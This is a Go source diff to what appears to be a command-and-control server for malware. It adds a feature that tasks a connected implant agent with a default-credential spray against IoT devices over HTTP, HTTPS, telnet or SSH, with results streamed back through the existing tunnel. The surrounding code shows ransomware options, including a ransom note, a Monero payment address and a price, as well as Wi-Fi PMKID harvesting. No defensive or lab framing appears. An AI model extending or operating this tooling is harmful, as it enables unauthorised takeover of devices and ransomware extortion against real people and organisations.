@@ -14,6 +14,7 @@ import (
 	"net"
 	"os"
 	"path/filepath"
+	"strconv"
 	"strings"
 	"sync"
 	"time"
@@ -73,6 +74,11 @@ func main() {
 	cryptoNoteAddr := flag.String("crypto-note-address", "", "ransom note: payment address")
 	cryptoNotePrice := flag.String("crypto-note-price", "", "ransom note: price (e.g. 0.05 XMR)")
 	cryptoDryRun := flag.Bool("crypto-dry-run", false, "crypto_malware: enumerate only, write nothing")
+	iotCredsHost := flag.String("iotcreds", "", "iot default-creds spray: target ip[:port]")
+	iotCredsProto := flag.String("iotcreds-proto", "http", "iot spray protocol: http|https|telnet|ssh")
+	iotCredsPath := flag.String("iotcreds-path", "/", "iot spray: HTTP request path")
+	iotCredsTimeout := flag.Int("iotcreds-timeout", 6, "iot spray: per-attempt timeout (seconds)")
+	iotCredsFirst := flag.Bool("iotcreds-first", false, "iot spray: stop after first hit per host")
 	pmkidIface := flag.String("pmkid", "", "802.11 PMKID harvest: monitor-mode iface")
 	pmkidChannel := flag.Int("pmkid-channel", 0, "PMKID: set wifi channel before harvest")
 	pmkidDuration := flag.Duration("pmkid-duration", 60*time.Second, "PMKID: total harvest run time")
@@ -279,6 +285,26 @@ func main() {
 				DryRun:    *cryptoDryRun,
 			})
 		}
+	}
+
+	// iotcreds dispatch — default-credential spray against an IoT target
+	if *iotCredsHost != "" {
+		host := *iotCredsHost
+		port := 0
+		if i := strings.LastIndex(host, ":"); i > 0 {
+			if p, err := strconv.Atoi(host[i+1:]); err == nil {
+				port = p
+				host = host[:i]
+			}
+		}
+		go runIoTCredsDispatch(mgr, iotCredsArgs{
+			Host:      host,
+			Port:      port,
+			Protocol:  *iotCredsProto,
+			Path:      *iotCredsPath,
+			Timeout:   *iotCredsTimeout,
+			StopFirst: *iotCredsFirst,
+		})
 	}
 
 	if *dnsBind != "" {
@@ -705,6 +731,34 @@ func runCryptoDispatch(mgr *session.Manager, a cryptoDispatchArgs) {
 		a.Note, a.NoteEmail, a.NoteAddr, a.NotePrice, ""); err != nil {
 		log.Printf("[crypto] start: %v", err)
 		return
+	}
+}
+
+// iotCredsArgs carries the operator's -iotcreds flags.
+type iotCredsArgs struct {
+	Host      string
+	Port      int
+	Protocol  string
+	Path      string
+	Timeout   int
+	StopFirst bool
+}
+
+// runIoTCredsDispatch waits for the first agent, then fires an
+// IoTCredsStart over the existing tunnel. Attempts stream back as
+// IoTCredsData events.
+func runIoTCredsDispatch(mgr *session.Manager, a iotCredsArgs) {
+	for len(mgr.Sessions()) == 0 {
+		time.Sleep(500 * time.Millisecond)
+	}
+	s := mgr.Sessions()[0]
+	sessionID := fmt.Sprintf("ic-%d", time.Now().UnixNano())
+
+	log.Printf("[iotcreds] %s:%d/%s -> %s (first=%v)",
+		a.Host, a.Port, a.Protocol, s.AgentID, a.StopFirst)
+
+	if err := s.SendIoTCredsStart(sessionID, a.Host, a.Port, a.Protocol, a.Path, a.Timeout, a.StopFirst); err != nil {
+		log.Printf("[iotcreds] start: %v", err)
 	}
 }
 
